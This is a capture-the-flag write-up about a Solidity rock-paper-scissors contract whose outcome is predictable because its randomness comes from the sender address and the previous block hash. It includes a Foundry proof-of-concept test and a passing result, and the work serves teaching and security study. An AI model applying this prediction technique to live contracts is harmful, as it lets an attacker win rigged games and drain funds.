# Challenge - Rock Scissor Paper

Tony found out average salary of smart contract developers could reach millions of dollars. He started to learn about Solidity and deployed his first ever smart contract of epic rock scissor paper game!

## Objective of CTF

Set the `defeated` variable to `true` in the `RockPaperScissors` contract.

## Vulnerability Analysis

The `randomShape` function rely on the `msg.sender`, `blockhash` and `block.number` as the source of randomness. Therefore, we could calculate the result of the `randomShape` function before playing

```solidity
function randomShape() internal view returns (Hand) {
    return Hand(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number - 1)))) % 3);
}
```

### Attack steps:

1. Calculate the result of `randomShape()` function before calling the `tryToBeatMe()` function.

## PoC test case

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {RockPaperScissors, Challenge} from "src/RockPaperScissors.sol";

contract RockPaperScissorsTest is Test {
    address player = makeAddr("player");
    Challenge challenge;
    RockPaperScissors rps;

    function setUp() public {
        challenge = new Challenge(player);
        rps = challenge.rps();
    }

    function testChallengeIsSolved() external {
        vm.startPrank(player);
        RockPaperScissors.Hand hand =
            RockPaperScissors.Hand(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number - 1)))) % 3);
        rps.tryToBeatMe(hand);
        vm.stopPrank();

        assertTrue(challenge.isSolved());
    }
}
```

### Test Result

```
Ran 1 test for test/RockPaperScissors.t.sol:RockPaperScissorsTest
[PASS] testChallengeIsSolved() (gas: 39732)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 12.61ms (2.59ms CPU time)

Ran 1 test suite in 259.80ms (12.61ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
